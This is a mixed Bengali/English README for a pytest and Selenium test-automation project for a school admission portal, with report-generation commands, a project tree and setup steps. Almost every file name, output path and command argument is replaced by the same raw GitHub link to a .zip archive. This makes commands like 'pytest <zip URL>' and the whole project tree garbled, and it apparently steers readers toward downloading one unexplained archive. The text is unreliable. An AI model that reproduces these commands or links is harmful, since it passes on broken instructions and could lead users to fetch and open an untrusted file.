run: 
pytest --browser=firefox --alluredir=allure_test_report 
allure serve allure_test_report 

allure generate .\allure_test_report\ --clean -o .\allure_html_report\ 

# 🧪 Test Report Generation with Pytest

Pytest বিভিন্ন ধরনের রিপোর্ট জেনারেট করতে পারে। নিচে report generation এর সাধারণ পদ্ধতিগুলো দেওয়া হলো 👇  

---

## 🔹 1. Default Console Report  
Pytest রান করলে by default টার্মিনালে রিপোর্ট দেখা যায়।  

```bash
pytest -v
🔹 2. JUnit XML Report
Continuous Integration (CI/CD) সিস্টেম (Jenkins, GitLab, GitHub Actions ইত্যাদি) এর জন্য XML report দরকার হয়।

bash
Copy code
pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip

🔹 3. HTML Report (pytest-html)
Static HTML রিপোর্ট জেনারেট করার জন্য pytest-html plugin ব্যবহার হয়।

Install
bash
Copy code
pip install pytest-html
Run
bash
Copy code
pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip --self-contained-html
📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip → যেকোনো browser-এ ওপেন করা যাবে।

🔹 4. Allure Report (Most Professional)
Allure Report industry-standard dashboard দেয় যেখানে chart, graph, এবং screenshot attach করা যায়।

Install
bash
Copy code
pip install allure-pytest
➡️ Allure commandline tool install করতে হবে।

Run
bash
Copy code
pytest --alluredir=allure-results
allure serve allure-results
📌 Output: Browser এ http://localhost:port/ → dynamic রিপোর্ট

🔹 5. Coverage Report (pytest-cov)
Test coverage দেখতে হলে pytest-cov ব্যবহার করা হয়।

Install
bash
Copy code
pip install pytest-cov
Run
bash
Copy code
pytest --cov=your_package --cov-report=html
📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip

🔹 6. Text / Log File Report
Text আকারে লগ রাখতে চাইলে ব্যবহার করা যায়।

bash
Copy code
pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
📌 Output: https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
⚠️ নোট: নতুন pytest version এ এই অপশন deprecated হতে পারে।

🔹 7. Fancy Console Output (pytest-sugar)
Colorful progress bar ও সুন্দর console UI চাইলে pytest-sugar ব্যবহার করা যায়।

Install
bash
Copy code
pip install pytest-sugar
Run
bash
Copy code
pytest -v
📌 Output: সুন্দর ও readable console report
# Doer School Admission Test Automation

## Project Structure

```
E:\projects\Tasks\Doer_School_Admission\
├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                    # Root level configuration
├── tests/                         # All test files
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│   ├── admission/                 # Admission specific test cases
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify All Available Admissions Display
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Search by School Name
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Campus
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Class
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Filter by Medium
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Clear All Filters
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Apply Now Button
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Download Circular
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Student Info Form (Valid Data)
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Student Info Form (Invalid Data)
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Additional Student Info
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Guardian Information
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Previous School Info
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Document Upload
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Application Submission
│   │   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify Payment Prompt
│   │   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Verify View Voucher
│   └── registration/              # Existing registration tests
│       ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│       ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│       └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
├── pages/                         # Page Object Models
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip      # Existing
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip       # Existing
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip           # New - Main admission page
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip        # New - Student form
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip       # New - Guardian form
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip            # New - Previous school form
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip            # New - Document upload
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip         # New - Review & submit
│   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                    # New - Payment & voucher
├── utils/
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip             # Existing
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                     # Existing - for registration
│   ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip           # New - for admission tests
│   └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                # Existing
├── logs/
├── Screenshots/
├── bug_reports/
├── test_files/                            # Test documents for upload
└── data/
    ├── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                          # Existing registration data
    └── https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip                # New admission test data
```

## Setup Instructions

### 1. Create Folder Structure
Create the following folders if they don't exist:
- `tests/admission/`
- `test_files/` (for document upload test files)

### 2. Create https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip Files
Add empty `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` files to make directories Python packages:
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (if not exists)

### 3. Add Test Data File
Place the `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` file in the `data/` directory.

### 4. Add Page Object Model Files
Add all the new page object files to the `pages/` directory:
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip`

### 5. Add Test Files
Add all test case files to the `tests/admission/` directory.

### 6. Create Test Files for Document Upload
For TC_AD_14, create sample test files in `test_files/` directory:
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample image file)
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample PDF file)
- `https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip` (sample PDF file)

## Running Tests

### Run All Admission Tests
```bash
pytest tests/admission/ -v --browser=chrome
```

### Run Specific Test Case
```bash
pytest https://raw.githubusercontent.com/Sinthiya-Prapti/Doer_School_Admission/main/agranulocyte/Doer_School_Admission.zip -v --browser=chrome
```

### Run Tests with Different Browsers
```bash
pytest tests/admission/ -v --browser=firefox
pytest tests/admission/ -v --browser=edge
```

### Run Tests with Logging
```bash
pytest tests/admission/ -v --browser=chrome --log-cli-level=INFO
```

## Test Cases Coverage

### Admission Portal Tests (TC_AD_01 to TC_AD_08)
- ✅ Display verification
- ✅ Search functionality
- ✅ Filter functionality
- ✅ Navigation to application form
- ✅ Download functionality

### Student Information Tests (TC_AD_09 to TC_AD_11)
- ✅ Valid data entry
- ✅ Invalid data validation
- ✅ Additional information form

### Guardian Information Test (TC_AD_12)
- ✅ Complete guardian information form

### Previous School Test (TC_AD_13)
- ✅ Previous academic details

### Document Upload Test (TC_AD_14)
- ✅ File upload functionality

### Application Submission Tests (TC_AD_15, TC_AD_16)
- ✅ Final submission and confirmation
- ✅ Payment prompt verification

### Payment Test (TC_AD_18)
- ✅ Voucher generation and display





